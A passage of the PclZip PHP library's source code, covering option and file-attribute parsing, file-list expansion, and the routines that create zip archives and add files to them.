            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Set the attribute
          $v_result_list[$p_options_list[$i]] = $v_function_name;
          $i++;
        break;

        default :
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
                                       "Unknown parameter '"
                                                           .$p_options_list[$i]."'");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return PclZip::errorCode();
      }

      // ----- Next options
      $i++;
    }

    // ----- Look for mandatory options
    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        // ----- Look for mandatory option
        if ($v_requested_options[$key] == 'mandatory') {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Detect a mandatory option : ".PclZipUtilOptionText($key)."(".$key.")");
          // ----- Look if present
          if (!isset($v_result_list[$key])) {
            // ----- Error log
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

            // ----- Return
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
        }
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privFileDescrParseAtt()
  // Description :
  // Parameters :
  // Return Values :
  //   1 on success.
  //   0 on failure.
  // --------------------------------------------------------------------------------
  function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privFileDescrParseAtt", "");
    $v_result=1;
    
    // ----- For each file in the list check the attributes
    foreach ($p_file_list as $v_key => $v_value) {
    
      // ----- Check if the option is supported
      if (!isset($v_requested_options[$v_key])) {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }

      // ----- Look for attribute
      switch ($v_key) {
        case PCLZIP_ATT_FILE_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");
          
          if ($p_filedescr['filename'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

        break;

        case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");

          if ($p_filedescr['new_short_name'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
        break;

        case PCLZIP_ATT_FILE_NEW_FULL_NAME :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");

          if ($p_filedescr['new_full_name'] == '') {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }
        break;

        // ----- Look for options that takes a string
        case PCLZIP_ATT_FILE_COMMENT :
          if (!is_string($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['comment'] = $v_value;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");
        break;

        case PCLZIP_ATT_FILE_MTIME :
          if (!is_integer($v_value)) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          $p_filedescr['mtime'] = $v_value;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");
        break;

        case PCLZIP_ATT_FILE_CONTENT :
          $p_filedescr['content'] = $v_value;
          ////--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "".PclZipUtilOptionText($v_key)." = '".$v_value."'");
        break;

        default :
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
                                           "Unknown parameter '".$v_key."'");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return PclZip::errorCode();
      }

      // ----- Look for mandatory options
      if ($v_requested_options !== false) {
        for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
          // ----- Look for mandatory option
          if ($v_requested_options[$key] == 'mandatory') {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Detect a mandatory option : ".PclZipUtilOptionText($key)."(".$key.")");
            // ----- Look if present
            if (!isset($p_file_list[$key])) {
              PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
              //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
              return PclZip::errorCode();
            }
          }
        }
      }
    
    // end foreach
    }
    
    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privFileDescrExpand()
  // Description :
  // Parameters :
  // Return Values :
  //   1 on success.
  //   0 on failure.
  // --------------------------------------------------------------------------------
  function privFileDescrExpand(&$p_filedescr_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privFileDescrExpand", "");
    $v_result=1;
    
    // ----- Create a result list
    $v_result_list = array();
    
    // ----- Look each entry
    for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Looking for file ".$i.".");
      
      // ----- Get filedescr
      $v_descr = $p_filedescr_list[$i];
      
      // ----- Reduce the filename
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filedescr before reduction :'".$v_descr['filename']."'");
      $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename']);
      $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filedescr after reduction :'".$v_descr['filename']."'");
      
      // ----- Look for real file or folder
      if (file_exists($v_descr['filename'])) {
        if (@is_file($v_descr['filename'])) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "This is a file");
          $v_descr['type'] = 'file';
        }
        else if (@is_dir($v_descr['filename'])) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "This is a folder");
          $v_descr['type'] = 'folder';
        }
        else if (@is_link($v_descr['filename'])) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Unsupported file type : link");
          // skip
          continue;
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Unsupported file type : unknown type");
          // skip
          continue;
        }
      }
      
      // ----- Look for string added as file
      else if (isset($v_descr['content'])) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "This is a string added as a file");
        $v_descr['type'] = 'virtual_file';
      }
      
      // ----- Missing file
      else {
        // ----- Error log
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$v_descr['filename']."' does not exists");
        PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exists");

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
      
      // ----- Calculate the stored filename
      $this->privCalculateStoredFilename($v_descr, $p_options);
      
      // ----- Add the descriptor in result list
      $v_result_list[sizeof($v_result_list)] = $v_descr;
      
      // ----- Look for folder
      if ($v_descr['type'] == 'folder') {
        // ----- List of items in folder
        $v_dirlist_descr = array();
        $v_dirlist_nb = 0;
        if ($v_folder_handler = @opendir($v_descr['filename'])) {
          while (($v_item_handler = @readdir($v_folder_handler)) !== false) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Looking for '".$v_item_handler."' in the directory");

            // ----- Skip '.' and '..'
            if (($v_item_handler == '.') || ($v_item_handler == '..')) {
                continue;
            }
            
            // ----- Compose the full filename
            $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
            
            // ----- Look for different stored filename
            // Because the name of the folder was changed, the name of the
            // files/sub-folders also change
            if ($v_descr['stored_filename'] != $v_descr['filename']) {
              if ($v_descr['stored_filename'] != '') {
                $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
              }
              else {
                $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
              }
            }
      
            $v_dirlist_nb++;
          }
          
          @closedir($v_folder_handler);
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unable to open dir '".$v_descr['filename']."' in read mode. Skipped.");
          // TBC : unable to open folder in read mode
        }
        
        // ----- Expand each element of the list
        if ($v_dirlist_nb != 0) {
          // ----- Expand
          if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }
          
          // ----- Concat the resulting list
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Merging result list (size '".sizeof($v_result_list)."') with dirlist (size '".sizeof($v_dirlist_descr)."')");
          $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "merged result list is size '".sizeof($v_result_list)."'");
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Nothing in this folder to expand.");
        }
          
        // ----- Free local array
        unset($v_dirlist_descr);
      }
    }
    
    // ----- Get the result list
    $p_filedescr_list = $v_result_list;

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privCreate()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCreate", "list");
    $v_result=1;
    $v_list_detail = array();
    
    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Open the file in write mode
    if (($v_result = $this->privOpenFd('wb')) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Add the list of files
    $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

    // ----- Close
    $this->privCloseFd();

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privAdd()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privAdd", "list");
    $v_result=1;
    $v_list_detail = array();

    // ----- Look if the archive exists or is empty
    if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Archive does not exist, or is empty, create it.");

      // ----- Do a create
      $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }
    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result=$this->privOpenFd('rb')) != 1)
    {
      // ----- Magic quotes trick
      $this->privSwapBackMagicQuotes();

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of File
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in file : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in file : ".ftell($this->zip_fd)."'");

    // ----- Creates a temporay file
    $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

    // ----- Open the temporary file in write mode
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Copy the files from the archive to the temporary file
    // TBC : Here I should better append the file and go back to erase the central dir
    $v_size = $v_central_dir['offset'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = fread($this->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Swap the file descriptor
    // Here is a trick : I swap the temporary fd with the zip fd, in order to use
    // the following methods on the temporary fil and not the real archive
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;

    // ----- Add the files
    $v_header_list = array();
    if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
    {
      fclose($v_zip_temp_fd);
      $this->privCloseFd();
      @unlink($v_zip_temp_name);
      $this->privSwapBackMagicQuotes();

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Store the offset of the central dir
    $v_offset = @ftell($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "New offset of central dir : $v_offset");

    // ----- Copy the block of file headers from the old archive
    $v_size = $v_central_dir['size'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
      @fwrite($this->zip_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Create the Central Dir files header
    for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
    {
      // ----- Create the file header
      if ($v_header_list[$i]['status'] == 'ok') {
        if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
          fclose($v_zip_temp_fd);
          $this->privCloseFd();
          @unlink($v_zip_temp_name);
          $this->privSwapBackMagicQuotes();

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }
        $v_count++;
      }

      // ----- Transform the header to a 'usable' info
      $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
    }

    // ----- Zip file comment
    $v_comment = $v_central_dir['comment'];
    if (isset($p_options[PCLZIP_OPT_COMMENT])) {
      $v_comment = $p_options[PCLZIP_OPT_COMMENT];
    }
    if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
      $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
    }
    if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
      $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
    }

    // ----- Calculate the size of the central header
    $v_size = @ftell($this->zip_fd)-$v_offset;

    // ----- Create the central dir footer
    if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
    {
      // ----- Reset the file list
      unset($v_header_list);
      $this->privSwapBackMagicQuotes();

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Swap back the file descriptor
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;

    // ----- Close
    $this->privCloseFd();

    // ----- Close the temporary file
    @fclose($v_zip_temp_fd);

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Delete the zip file
    // TBC : I should test the result ...
    @unlink($this->zipname);

    // ----- Rename the temporary file
    // TBC : I should test the result ...
    //@rename($v_zip_temp_name, $this->zipname);
    PclZipUtilRename($v_zip_temp_name, $this->zipname);

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privOpenFd()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function privOpenFd($p_mode)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privOpenFd", 'mode='.$p_mode);
    $v_result=1;

    // ----- Look if already open
    if ($this->zip_fd != 0)
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Open file in '.$p_mode.' mode');
    if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privCloseFd()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function privCloseFd()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCloseFd", "");
    $v_result=1;

    if ($this->zip_fd != 0)
      @fclose($this->zip_fd);
    $this->zip_fd = 0;

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privAddList()
  // Description :
  //   $p_add_dir and $p_remove_dir will give the ability to memorize a path which is
  //   different from the real path of the file. This is usefull if you want to have PclTar
  //   running in any directory, and memorize relative path from an other directory.
  // Parameters :
  //   $p_list : An array containing the file or directory names to add in the tar
  //   $p_result_list : list of added files with their properties (specially the status field)
  //   $p_add_dir : Path to add in the filename path archived
  //   $p_remove_dir : Path to remove in the filename path archived
  // Return Values :
  // --------------------------------------------------------------------------------
//  function privAddList($p_list, &$p_result_list, $p_add_dir, $p_remove_dir, $p_remove_all_dir, &$p_options)
  function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privAddList", "list");
    $v_result=1;

    // ----- Add the files
    $v_header_list = array();
    if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Store the offset of the central dir
    $v_offset = @ftell($this->zip_fd);

    // ----- Create the Central Dir files header
    for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
    {
      // ----- Create the file header
      if ($v_header_list[$i]['status'] == 'ok') {
        if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }
        $v_count++;
      }

      // ----- Transform the header to a 'usable' info
      $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
    }

    // ----- Zip file comment
    $v_comment = '';
    if (isset($p_options[PCLZIP_OPT_COMMENT])) {
      $v_comment = $p_options[PCLZIP_OPT_COMMENT];
    }

    // ----- Calculate the size of the central header
    $v_size = @ftell($this->zip_fd)-$v_offset;

    // ----- Create the central dir footer
    if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
    {
      // ----- Reset the file list
      unset($v_header_list);

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privAddFileList()
  // Description :
  // Parameters :
  //   $p_filedescr_list : An array containing the file description 
  //                      or directory names to add in the zip
  //   $p_result_list : list of added files with their properties (specially the status field)
  // Return Values :
  // --------------------------------------------------------------------------------
  function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privAddFileList", "filedescr_list");
    $v_result=1;
    $v_header = array();

    // ----- Recuperate the current number of elt in list
    $v_nb = sizeof($p_result_list);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Before add, list have ".$v_nb." elements");

    // ----- Loop on the files
    for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
      // ----- Format the filename
      $p_filedescr_list[$j]['filename']
      = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
      
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Looking for file '".$p_filedescr_list[$j]['filename']."'");

      // ----- Skip empty file names
      // TBC : Can this be possible ? not checked in DescrParseAtt ?
      if ($p_filedescr_list[$j]['filename'] == "") {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Skip empty filename");
        continue;
      }

      // ----- Check the filename
      if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
          && (!file_exists($p_filedescr_list[$j]['filename']))) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$p_filedescr_list[$j]['filename']."' does not exists");
        PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exists");
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }

      // ----- Look if it is a file or a dir with no all path remove option
      // or a dir with all its path removed
//      if (   (is_file($p_filedescr_list[$j]['filename']))
//          || (   is_dir($p_filedescr_list[$j]['filename'])
      if (   ($p_filedescr_list[$j]['type'] == 'file')
          || ($p_filedescr_list[$j]['type'] == 'virtual_file')
          || (   ($p_filedescr_list[$j]['type'] == 'folder')
              && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                  || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
          ) {

        // ----- Add the file
        $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                       $p_options);
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }

        // ----- Store the file infos
        $p_result_list[$v_nb++] = $v_header;
      }
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "After add, list have ".$v_nb." elements");

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privAddFile()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privAddFile($p_filedescr, &$p_header, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privAddFile", "filename='".$p_filedescr['filename']."'");
    $v_result=1;
    
    // ----- Working variable
    $p_filename = $p_filedescr['filename'];

    // TBC : Already done in the fileAtt check ... ?
    if ($p_filename == "") {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }
